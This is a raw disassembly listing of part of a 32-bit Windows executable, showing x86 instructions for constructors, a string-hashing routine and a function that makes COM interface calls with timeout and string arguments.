  402a70:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402a76:	8b f1                	mov    %ecx,%esi
  402a78:	c7 45 e8 5c 5d 43 00 	movl   $0x435d5c,-0x18(%ebp)
  402a7f:	c7 45 e8 74 5d 43 00 	movl   $0x435d74,-0x18(%ebp)
  402a86:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  402a8d:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402a94:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402a9b:	8b 06                	mov    (%esi),%eax
  402a9d:	ff 50 44             	call   *0x44(%eax)
  402aa0:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402aa7:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402aae:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402ab5:	c7 45 e8 74 5d 43 00 	movl   $0x435d74,-0x18(%ebp)
  402abc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402abf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402ac6:	59                   	pop    %ecx
  402ac7:	5e                   	pop    %esi
  402ac8:	8b e5                	mov    %ebp,%esp
  402aca:	5d                   	pop    %ebp
  402acb:	c3                   	ret
  402acc:	cc                   	int3
  402acd:	cc                   	int3
  402ace:	cc                   	int3
  402acf:	cc                   	int3
  402ad0:	55                   	push   %ebp
  402ad1:	8b ec                	mov    %esp,%ebp
  402ad3:	8b 45 08             	mov    0x8(%ebp),%eax
  402ad6:	56                   	push   %esi
  402ad7:	8b f1                	mov    %ecx,%esi
  402ad9:	c7 06 74 5d 43 00    	movl   $0x435d74,(%esi)
  402adf:	a8 01                	test   $0x1,%al
  402ae1:	74 1b                	je     0x402afe
  402ae3:	a8 04                	test   $0x4,%al
  402ae5:	75 0c                	jne    0x402af3
  402ae7:	e8 64 8a 01 00       	call   0x41b550
  402aec:	8b c6                	mov    %esi,%eax
  402aee:	5e                   	pop    %esi
  402aef:	5d                   	pop    %ebp
  402af0:	c2 04 00             	ret    $0x4
  402af3:	6a 0c                	push   $0xc
  402af5:	56                   	push   %esi
  402af6:	e8 85 eb ff ff       	call   0x401680
  402afb:	83 c4 08             	add    $0x8,%esp
  402afe:	8b c6                	mov    %esi,%eax
  402b00:	5e                   	pop    %esi
  402b01:	5d                   	pop    %ebp
  402b02:	c2 04 00             	ret    $0x4
  402b05:	cc                   	int3
  402b06:	cc                   	int3
  402b07:	cc                   	int3
  402b08:	cc                   	int3
  402b09:	cc                   	int3
  402b0a:	cc                   	int3
  402b0b:	cc                   	int3
  402b0c:	cc                   	int3
  402b0d:	cc                   	int3
  402b0e:	cc                   	int3
  402b0f:	cc                   	int3
  402b10:	c7 01 74 5d 43 00    	movl   $0x435d74,(%ecx)
  402b16:	c3                   	ret
  402b17:	cc                   	int3
  402b18:	cc                   	int3
  402b19:	cc                   	int3
  402b1a:	cc                   	int3
  402b1b:	cc                   	int3
  402b1c:	cc                   	int3
  402b1d:	cc                   	int3
  402b1e:	cc                   	int3
  402b1f:	cc                   	int3
  402b20:	85 c9                	test   %ecx,%ecx
  402b22:	74 07                	je     0x402b2b
  402b24:	8b 01                	mov    (%ecx),%eax
  402b26:	6a 01                	push   $0x1
  402b28:	ff 50 2c             	call   *0x2c(%eax)
  402b2b:	c3                   	ret
  402b2c:	cc                   	int3
  402b2d:	cc                   	int3
  402b2e:	cc                   	int3
  402b2f:	cc                   	int3
  402b30:	c2 04 00             	ret    $0x4
  402b33:	cc                   	int3
  402b34:	cc                   	int3
  402b35:	cc                   	int3
  402b36:	cc                   	int3
  402b37:	cc                   	int3
  402b38:	cc                   	int3
  402b39:	cc                   	int3
  402b3a:	cc                   	int3
  402b3b:	cc                   	int3
  402b3c:	cc                   	int3
  402b3d:	cc                   	int3
  402b3e:	cc                   	int3
  402b3f:	cc                   	int3
  402b40:	55                   	push   %ebp
  402b41:	8b ec                	mov    %esp,%ebp
  402b43:	6a ff                	push   $0xffffffff
  402b45:	68 41 f1 42 00       	push   $0x42f141
  402b4a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402b50:	50                   	push   %eax
  402b51:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402b56:	33 c5                	xor    %ebp,%eax
  402b58:	50                   	push   %eax
  402b59:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402b5c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402b62:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  402b68:	8b 08                	mov    (%eax),%ecx
  402b6a:	a1 04 66 44 00       	mov    0x446604,%eax
  402b6f:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  402b75:	7f 14                	jg     0x402b8b
  402b77:	b8 08 66 44 00       	mov    $0x446608,%eax
  402b7c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402b7f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402b86:	59                   	pop    %ecx
  402b87:	8b e5                	mov    %ebp,%esp
  402b89:	5d                   	pop    %ebp
  402b8a:	c3                   	ret
  402b8b:	68 04 66 44 00       	push   $0x446604
  402b90:	e8 5f b0 02 00       	call   0x42dbf4
  402b95:	83 c4 04             	add    $0x4,%esp
  402b98:	83 3d 04 66 44 00 ff 	cmpl   $0xffffffff,0x446604
  402b9f:	75 d6                	jne    0x402b77
  402ba1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402ba8:	b9 0c 66 44 00       	mov    $0x44660c,%ecx
  402bad:	68 bc 5d 43 00       	push   $0x435dbc
  402bb2:	c7 05 08 66 44 00 80 	movl   $0x402880,0x446608
  402bb9:	28 40 00 
  402bbc:	e8 6f 00 00 00       	call   0x402c30
  402bc1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402bc8:	68 04 66 44 00       	push   $0x446604
  402bcd:	e8 d8 af 02 00       	call   0x42dbaa
  402bd2:	83 c4 04             	add    $0x4,%esp
  402bd5:	eb a0                	jmp    0x402b77
  402bd7:	cc                   	int3
  402bd8:	cc                   	int3
  402bd9:	cc                   	int3
  402bda:	cc                   	int3
  402bdb:	cc                   	int3
  402bdc:	cc                   	int3
  402bdd:	cc                   	int3
  402bde:	cc                   	int3
  402bdf:	cc                   	int3
  402be0:	55                   	push   %ebp
  402be1:	8b ec                	mov    %esp,%ebp
  402be3:	e8 58 ff ff ff       	call   0x402b40
  402be8:	8b 55 08             	mov    0x8(%ebp),%edx
  402beb:	3b d0                	cmp    %eax,%edx
  402bed:	74 2a                	je     0x402c19
  402bef:	8b 48 0c             	mov    0xc(%eax),%ecx
  402bf2:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  402bf5:	75 1c                	jne    0x402c13
  402bf7:	8b 4a 08             	mov    0x8(%edx),%ecx
  402bfa:	39 48 08             	cmp    %ecx,0x8(%eax)
  402bfd:	75 14                	jne    0x402c13
  402bff:	51                   	push   %ecx
  402c00:	ff 72 04             	push   0x4(%edx)
  402c03:	ff 70 04             	push   0x4(%eax)
  402c06:	ff 15 c4 54 43 00    	call   *0x4354c4
  402c0c:	83 c4 0c             	add    $0xc,%esp
  402c0f:	85 c0                	test   %eax,%eax
  402c11:	74 06                	je     0x402c19
  402c13:	33 c0                	xor    %eax,%eax
  402c15:	5d                   	pop    %ebp
  402c16:	c2 04 00             	ret    $0x4
  402c19:	b8 01 00 00 00       	mov    $0x1,%eax
  402c1e:	5d                   	pop    %ebp
  402c1f:	c2 04 00             	ret    $0x4
  402c22:	cc                   	int3
  402c23:	cc                   	int3
  402c24:	cc                   	int3
  402c25:	cc                   	int3
  402c26:	cc                   	int3
  402c27:	cc                   	int3
  402c28:	cc                   	int3
  402c29:	cc                   	int3
  402c2a:	cc                   	int3
  402c2b:	cc                   	int3
  402c2c:	cc                   	int3
  402c2d:	cc                   	int3
  402c2e:	cc                   	int3
  402c2f:	cc                   	int3
  402c30:	55                   	push   %ebp
  402c31:	8b ec                	mov    %esp,%ebp
  402c33:	51                   	push   %ecx
  402c34:	8b 45 08             	mov    0x8(%ebp),%eax
  402c37:	8b d1                	mov    %ecx,%edx
  402c39:	56                   	push   %esi
  402c3a:	85 c0                	test   %eax,%eax
  402c3c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402c3f:	be c7 5d 43 00       	mov    $0x435dc7,%esi
  402c44:	0f 45 f0             	cmovne %eax,%esi
  402c47:	89 32                	mov    %esi,(%edx)
  402c49:	57                   	push   %edi
  402c4a:	8d 7a 04             	lea    0x4(%edx),%edi
  402c4d:	85 f6                	test   %esi,%esi
  402c4f:	74 40                	je     0x402c91
  402c51:	8a 06                	mov    (%esi),%al
  402c53:	84 c0                	test   %al,%al
  402c55:	74 3a                	je     0x402c91
  402c57:	53                   	push   %ebx
  402c58:	8b d6                	mov    %esi,%edx
  402c5a:	0f be d8             	movsbl %al,%ebx
  402c5d:	33 c9                	xor    %ecx,%ecx
  402c5f:	90                   	nop
  402c60:	8b c1                	mov    %ecx,%eax
  402c62:	42                   	inc    %edx
  402c63:	8d 0c 83             	lea    (%ebx,%eax,4),%ecx
  402c66:	0f be 1a             	movsbl (%edx),%ebx
  402c69:	03 c8                	add    %eax,%ecx
  402c6b:	85 db                	test   %ebx,%ebx
  402c6d:	75 f1                	jne    0x402c60
  402c6f:	5b                   	pop    %ebx
  402c70:	85 ff                	test   %edi,%edi
  402c72:	74 04                	je     0x402c78
  402c74:	2b d6                	sub    %esi,%edx
  402c76:	89 17                	mov    %edx,(%edi)
  402c78:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402c7b:	83 c9 01             	or     $0x1,%ecx
  402c7e:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
  402c84:	8b c2                	mov    %edx,%eax
  402c86:	5f                   	pop    %edi
  402c87:	5e                   	pop    %esi
  402c88:	89 4a 08             	mov    %ecx,0x8(%edx)
  402c8b:	8b e5                	mov    %ebp,%esp
  402c8d:	5d                   	pop    %ebp
  402c8e:	c2 04 00             	ret    $0x4
  402c91:	85 ff                	test   %edi,%edi
  402c93:	74 06                	je     0x402c9b
  402c95:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  402c9b:	33 c9                	xor    %ecx,%ecx
  402c9d:	8b c2                	mov    %edx,%eax
  402c9f:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
  402ca5:	5f                   	pop    %edi
  402ca6:	89 4a 08             	mov    %ecx,0x8(%edx)
  402ca9:	5e                   	pop    %esi
  402caa:	8b e5                	mov    %ebp,%esp
  402cac:	5d                   	pop    %ebp
  402cad:	c2 04 00             	ret    $0x4
  402cb0:	55                   	push   %ebp
  402cb1:	8b ec                	mov    %esp,%ebp
  402cb3:	6a ff                	push   $0xffffffff
  402cb5:	68 25 f2 42 00       	push   $0x42f225
  402cba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402cc0:	50                   	push   %eax
  402cc1:	81 ec d8 00 00 00    	sub    $0xd8,%esp
  402cc7:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402ccc:	33 c5                	xor    %ebp,%eax
  402cce:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402cd1:	56                   	push   %esi
  402cd2:	57                   	push   %edi
  402cd3:	50                   	push   %eax
  402cd4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402cd7:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402cdd:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  402ce0:	8b f1                	mov    %ecx,%esi
  402ce2:	89 b5 50 ff ff ff    	mov    %esi,-0xb0(%ebp)
  402ce8:	89 75 cc             	mov    %esi,-0x34(%ebp)
  402ceb:	8b 45 0c             	mov    0xc(%ebp),%eax
  402cee:	89 45 a0             	mov    %eax,-0x60(%ebp)
  402cf1:	8b 45 10             	mov    0x10(%ebp),%eax
  402cf4:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402cf7:	8b 45 14             	mov    0x14(%ebp),%eax
  402cfa:	89 b5 4c ff ff ff    	mov    %esi,-0xb4(%ebp)
  402d00:	89 45 a8             	mov    %eax,-0x58(%ebp)
  402d03:	8b 45 1c             	mov    0x1c(%ebp),%eax
  402d06:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%ebp)
  402d0d:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  402d13:	8b 45 20             	mov    0x20(%ebp),%eax
  402d16:	c7 45 ac 5c 5d 43 00 	movl   $0x435d5c,-0x54(%ebp)
  402d1d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402d20:	c7 45 ac 74 5d 43 00 	movl   $0x435d74,-0x54(%ebp)
  402d27:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%ebp)
  402d2e:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  402d35:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402d3c:	c7 45 ac 10 5d 43 00 	movl   $0x435d10,-0x54(%ebp)
  402d43:	c7 45 b8 00 00 00 00 	movl   $0x0,-0x48(%ebp)
  402d4a:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  402d51:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  402d58:	c7 45 c4 40 00 00 00 	movl   $0x40,-0x3c(%ebp)
  402d5f:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  402d66:	6a 00                	push   $0x0
  402d68:	c7 45 e0 73 93 f2 06 	movl   $0x6f29373,-0x20(%ebp)
  402d6f:	c7 45 e4 5a 5c 54 4b 	movl   $0x4b545c5a,-0x1c(%ebp)
  402d76:	c7 45 e8 b0 25 6e f1 	movl   $0xf16e25b0,-0x18(%ebp)
  402d7d:	c7 45 ec bf 8a bf 0e 	movl   $0xebf8abf,-0x14(%ebp)
  402d84:	ff 15 54 55 43 00    	call   *0x435554
  402d8a:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402d8d:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  402d94:	50                   	push   %eax
  402d95:	68 d0 5d 43 00       	push   $0x435dd0
  402d9a:	ff 15 50 55 43 00    	call   *0x435550
  402da0:	85 c0                	test   %eax,%eax
  402da2:	79 29                	jns    0x402dcd
  402da4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402da7:	8b ce                	mov    %esi,%ecx
  402da9:	50                   	push   %eax
  402daa:	e8 41 f3 ff ff       	call   0x4020f0
  402daf:	c7 45 98 01 00 00 00 	movl   $0x1,-0x68(%ebp)
  402db6:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  402dba:	c7 45 ac 10 5d 43 00 	movl   $0x435d10,-0x54(%ebp)
  402dc1:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  402dc8:	e9 41 06 00 00       	jmp    0x40340e
  402dcd:	8d 45 cc             	lea    -0x34(%ebp),%eax
  402dd0:	50                   	push   %eax
  402dd1:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402dd4:	50                   	push   %eax
  402dd5:	6a 01                	push   $0x1
  402dd7:	6a 00                	push   $0x0
  402dd9:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402ddc:	50                   	push   %eax
  402ddd:	ff 15 4c 55 43 00    	call   *0x43554c
  402de3:	8b f8                	mov    %eax,%edi
  402de5:	85 ff                	test   %edi,%edi
  402de7:	78 1f                	js     0x402e08
  402de9:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402dec:	68 98 3a 00 00       	push   $0x3a98
  402df1:	68 98 3a 00 00       	push   $0x3a98
  402df6:	68 98 3a 00 00       	push   $0x3a98
  402dfb:	8b 08                	mov    (%eax),%ecx
  402dfd:	68 98 3a 00 00       	push   $0x3a98
  402e02:	50                   	push   %eax
  402e03:	ff 51 5c             	call   *0x5c(%ecx)
  402e06:	8b f8                	mov    %eax,%edi
  402e08:	8b 55 c8             	mov    -0x38(%ebp),%edx
  402e0b:	33 c0                	xor    %eax,%eax
  402e0d:	8b 4a 0c             	mov    0xc(%edx),%ecx
  402e10:	85 c9                	test   %ecx,%ecx
  402e12:	74 08                	je     0x402e1c
  402e14:	66 39 01             	cmp    %ax,(%ecx)
  402e17:	0f 94 c0             	sete   %al
  402e1a:	eb 07                	jmp    0x402e23
  402e1c:	83 7a 24 02          	cmpl   $0x2,0x24(%edx)
  402e20:	0f 9e c0             	setle  %al
  402e23:	8b 35 20 52 43 00    	mov    0x435220,%esi
  402e29:	85 c0                	test   %eax,%eax
  402e2b:	75 6d                	jne    0x402e9a
  402e2d:	85 ff                	test   %edi,%edi
  402e2f:	0f 88 8c 03 00 00    	js     0x4031c1
  402e35:	bf 08 00 00 00       	mov    $0x8,%edi
  402e3a:	66 89 bd 54 ff ff ff 	mov    %di,-0xac(%ebp)
  402e41:	85 c9                	test   %ecx,%ecx
  402e43:	75 0d                	jne    0x402e52
  402e45:	39 4a 24             	cmp    %ecx,0x24(%edx)
  402e48:	b9 c0 57 43 00       	mov    $0x4357c0,%ecx
  402e4d:	74 03                	je     0x402e52
  402e4f:	8b 4a 1c             	mov    0x1c(%edx),%ecx
  402e52:	51                   	push   %ecx
  402e53:	ff d6                	call   *%esi
  402e55:	68 c0 57 43 00       	push   $0x4357c0
  402e5a:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  402e60:	66 89 bd 2c ff ff ff 	mov    %di,-0xd4(%ebp)
  402e67:	ff d6                	call   *%esi
  402e69:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402e6c:	83 ec 10             	sub    $0x10,%esp
  402e6f:	89 85 34 ff ff ff    	mov    %eax,-0xcc(%ebp)
  402e75:	8b c4                	mov    %esp,%eax
  402e77:	0f 10 85 2c ff ff ff 	movups -0xd4(%ebp),%xmm0
  402e7e:	83 ec 10             	sub    $0x10,%esp
  402e81:	8b 11                	mov    (%ecx),%edx
  402e83:	0f 11 00             	movups %xmm0,(%eax)
  402e86:	8b c4                	mov    %esp,%eax
  402e88:	0f 10 85 54 ff ff ff 	movups -0xac(%ebp),%xmm0
  402e8f:	6a 02                	push   $0x2
  402e91:	51                   	push   %ecx
  402e92:	0f 11 00             	movups %xmm0,(%eax)
  402e95:	ff 52 1c             	call   *0x1c(%edx)
  402e98:	8b f8                	mov    %eax,%edi
  402e9a:	85 ff                	test   %edi,%edi
  402e9c:	0f 88 1f 03 00 00    	js     0x4031c1
  402ea2:	68 c8 5d 43 00       	push   $0x435dc8
  402ea7:	ff d6                	call   *%esi
  402ea9:	8b f8                	mov    %eax,%edi
  402eab:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402eae:	89 7d c8             	mov    %edi,-0x38(%ebp)
  402eb1:	8b 48 0c             	mov    0xc(%eax),%ecx
  402eb4:	85 c9                	test   %ecx,%ecx
  402eb6:	75 0d                	jne    0x402ec5
  402eb8:	39 48 24             	cmp    %ecx,0x24(%eax)
  402ebb:	b9 c0 57 43 00       	mov    $0x4357c0,%ecx
  402ec0:	74 03                	je     0x402ec5
  402ec2:	8b 48 1c             	mov    0x1c(%eax),%ecx
  402ec5:	51                   	push   %ecx
  402ec6:	ff d6                	call   *%esi
  402ec8:	8b f0                	mov    %eax,%esi
  402eca:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  402ed0:	50                   	push   %eax
  402ed1:	ff 15 18 52 43 00    	call   *0x435218
  402ed7:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402eda:	83 ec 10             	sub    $0x10,%esp
  402edd:	b8 0b 00 00 00       	mov    $0xb,%eax
  402ee2:	66 89 85 3c ff ff ff 	mov    %ax,-0xc4(%ebp)
  402ee9:	33 c0                	xor    %eax,%eax
  402eeb:	66 89 85 44 ff ff ff 	mov    %ax,-0xbc(%ebp)
  402ef2:	8b c4                	mov    %esp,%eax
  402ef4:	0f 10 85 3c ff ff ff 	movups -0xc4(%ebp),%xmm0
  402efb:	8b 11                	mov    (%ecx),%edx
  402efd:	56                   	push   %esi
  402efe:	57                   	push   %edi
  402eff:	51                   	push   %ecx
  402f00:	0f 11 00             	movups %xmm0,(%eax)
  402f03:	ff 52 24             	call   *0x24(%edx)
  402f06:	ff 75 c8             	push   -0x38(%ebp)
  402f09:	8b f8                	mov    %eax,%edi
  402f0b:	ff 15 08 52 43 00    	call   *0x435208
  402f11:	56                   	push   %esi
  402f12:	ff 15 08 52 43 00    	call   *0x435208
  402f18:	85 ff                	test   %edi,%edi
  402f1a:	0f 88 9b 02 00 00    	js     0x4031bb
  402f20:	b8 16 00 00 00       	mov    $0x16,%eax
  402f25:	c7 85 24 ff ff ff 00 	movl   $0x3300,-0xdc(%ebp)
  402f2c:	33 00 00 
  402f2f:	66 89 85 1c ff ff ff 	mov    %ax,-0xe4(%ebp)
  402f36:	8d 95 1c ff ff ff    	lea    -0xe4(%ebp),%edx
  402f3c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402f3f:	52                   	push   %edx
  402f40:	6a 04                	push   $0x4
  402f42:	50                   	push   %eax
  402f43:	8b 08                	mov    (%eax),%ecx
  402f45:	ff 51 4c             	call   *0x4c(%ecx)
  402f48:	8b f8                	mov    %eax,%edi
  402f4a:	85 ff                	test   %edi,%edi
  402f4c:	0f 88 69 02 00 00    	js     0x4031bb
  402f52:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  402f58:	e8 e3 f7 ff ff       	call   0x402740
  402f5d:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  402f61:	c7 85 6c ff ff ff 54 	movl   $0x435f54,-0x94(%ebp)
  402f68:	5f 43 00 
  402f6b:	c7 85 78 ff ff ff 08 	movl   $0x435e08,-0x88(%ebp)
  402f72:	5e 43 00 
  402f75:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  402f79:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  402f7f:	85 c0                	test   %eax,%eax
  402f81:	75 0d                	jne    0x402f90
  402f83:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  402f87:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  402f8c:	0f 45 45 88          	cmovne -0x78(%ebp),%eax
  402f90:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  402f93:	83 ec 0c             	sub    $0xc,%esp
  402f96:	50                   	push   %eax
  402f97:	e8 f4 bc 01 00       	call   0x41ec90
  402f9c:	8b f0                	mov    %eax,%esi
  402f9e:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402fa2:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  402fa8:	e8 73 ec ff ff       	call   0x401c20
  402fad:	83 fe ff             	cmp    $0xffffffff,%esi
  402fb0:	75 35                	jne    0x402fe7
  402fb2:	8b 35 20 52 43 00    	mov    0x435220,%esi
  402fb8:	68 18 5e 43 00       	push   $0x435e18
  402fbd:	ff d6                	call   *%esi
  402fbf:	68 28 5e 43 00       	push   $0x435e28
  402fc4:	8b f8                	mov    %eax,%edi
  402fc6:	ff d6                	call   *%esi
  402fc8:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402fcb:	8b f0                	mov    %eax,%esi
  402fcd:	56                   	push   %esi
  402fce:	57                   	push   %edi
  402fcf:	51                   	push   %ecx
  402fd0:	8b 11                	mov    (%ecx),%edx
  402fd2:	ff 52 28             	call   *0x28(%edx)
  402fd5:	57                   	push   %edi
  402fd6:	8b 3d 08 52 43 00    	mov    0x435208,%edi
  402fdc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402fdf:	ff d7                	call   *%edi
  402fe1:	56                   	push   %esi
  402fe2:	ff d7                	call   *%edi
  402fe4:	8b 7d c8             	mov    -0x38(%ebp),%edi
  402fe7:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  402fed:	e8 4e f7 ff ff       	call   0x402740
  402ff2:	c6 45 fc 07          	movb   $0x7,-0x4(%ebp)
  402ff6:	c7 85 6c ff ff ff 54 	movl   $0x435f54,-0x94(%ebp)
  402ffd:	5f 43 00 
  403000:	c7 85 78 ff ff ff 30 	movl   $0x435e30,-0x88(%ebp)
  403007:	5e 43 00 
  40300a:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  40300e:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  403014:	85 c0                	test   %eax,%eax
  403016:	75 0d                	jne    0x403025
  403018:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  40301c:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  403021:	0f 45 45 88          	cmovne -0x78(%ebp),%eax
  403025:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  403028:	83 ec 0c             	sub    $0xc,%esp
  40302b:	50                   	push   %eax
  40302c:	e8 5f bc 01 00       	call   0x41ec90
  403031:	8b f0                	mov    %eax,%esi
  403033:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403037:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40303d:	e8 de eb ff ff       	call   0x401c20
  403042:	83 fe ff             	cmp    $0xffffffff,%esi
  403045:	75 4b                	jne    0x403092
  403047:	8b 35 20 52 43 00    	mov    0x435220,%esi
  40304d:	68 44 5e 43 00       	push   $0x435e44
  403052:	ff d6                	call   *%esi
  403054:	8b f8                	mov    %eax,%edi
  403056:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  403059:	89 7d c8             	mov    %edi,-0x38(%ebp)
  40305c:	8b 48 0c             	mov    0xc(%eax),%ecx
  40305f:	85 c9                	test   %ecx,%ecx
  403061:	75 0d                	jne    0x403070
  403063:	39 48 24             	cmp    %ecx,0x24(%eax)
  403066:	b9 c0 57 43 00       	mov    $0x4357c0,%ecx
  40306b:	74 03                	je     0x403070
  40306d:	8b 48 1c             	mov    0x1c(%eax),%ecx
  403070:	51                   	push   %ecx
  403071:	ff d6                	call   *%esi
  403073:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  403076:	8b f0                	mov    %eax,%esi
  403078:	56                   	push   %esi
  403079:	57                   	push   %edi
  40307a:	51                   	push   %ecx
  40307b:	8b 11                	mov    (%ecx),%edx
  40307d:	ff 52 28             	call   *0x28(%edx)
  403080:	ff 75 c8             	push   -0x38(%ebp)
  403083:	8b f8                	mov    %eax,%edi
  403085:	ff 15 08 52 43 00    	call   *0x435208
  40308b:	56                   	push   %esi
  40308c:	ff 15 08 52 43 00    	call   *0x435208
  403092:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  403098:	e8 a3 f6 ff ff       	call   0x402740
  40309d:	c6 45 fc 0a          	movb   $0xa,-0x4(%ebp)
  4030a1:	c7 85 6c ff ff ff 54 	movl   $0x435f54,-0x94(%ebp)
  4030a8:	5f 43 00 
  4030ab:	c7 85 78 ff ff ff 54 	movl   $0x435e54,-0x88(%ebp)
  4030b2:	5e 43 00 
  4030b5:	c6 45 fc 0b          	movb   $0xb,-0x4(%ebp)
  4030b9:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  4030bf:	85 c0                	test   %eax,%eax
  4030c1:	75 0d                	jne    0x4030d0
  4030c3:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  4030c7:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  4030cc:	0f 45 45 88          	cmovne -0x78(%ebp),%eax
  4030d0:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4030d3:	83 ec 0c             	sub    $0xc,%esp
  4030d6:	50                   	push   %eax
  4030d7:	e8 b4 bb 01 00       	call   0x41ec90
  4030dc:	8b f0                	mov    %eax,%esi
  4030de:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4030e2:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  4030e8:	e8 33 eb ff ff       	call   0x401c20
  4030ed:	83 fe ff             	cmp    $0xffffffff,%esi
  4030f0:	75 35                	jne    0x403127
  4030f2:	8b 35 20 52 43 00    	mov    0x435220,%esi
  4030f8:	68 78 5e 43 00       	push   $0x435e78
  4030fd:	ff d6                	call   *%esi
  4030ff:	68 c4 57 43 00       	push   $0x4357c4
  403104:	8b f8                	mov    %eax,%edi
  403106:	ff d6                	call   *%esi
  403108:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40310b:	8b f0                	mov    %eax,%esi
  40310d:	56                   	push   %esi
  40310e:	57                   	push   %edi
  40310f:	51                   	push   %ecx
  403110:	8b 11                	mov    (%ecx),%edx
  403112:	ff 52 28             	call   *0x28(%edx)
  403115:	57                   	push   %edi
  403116:	8b 3d 08 52 43 00    	mov    0x435208,%edi
  40311c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40311f:	ff d7                	call   *%edi
  403121:	56                   	push   %esi
  403122:	ff d7                	call   *%edi
  403124:	8b 7d c8             	mov    -0x38(%ebp),%edi
  403127:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40312d:	e8 0e f6 ff ff       	call   0x402740
  403132:	c6 45 fc 0d          	movb   $0xd,-0x4(%ebp)
  403136:	c7 85 6c ff ff ff 54 	movl   $0x435f54,-0x94(%ebp)
  40313d:	5f 43 00 
  403140:	c7 85 78 ff ff ff 98 	movl   $0x435e98,-0x88(%ebp)
  403147:	5e 43 00 
  40314a:	c6 45 fc 0e          	movb   $0xe,-0x4(%ebp)
  40314e:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  403154:	85 c0                	test   %eax,%eax
  403156:	75 0c                	jne    0x403164
  403158:	39 45 90             	cmp    %eax,-0x70(%ebp)
  40315b:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
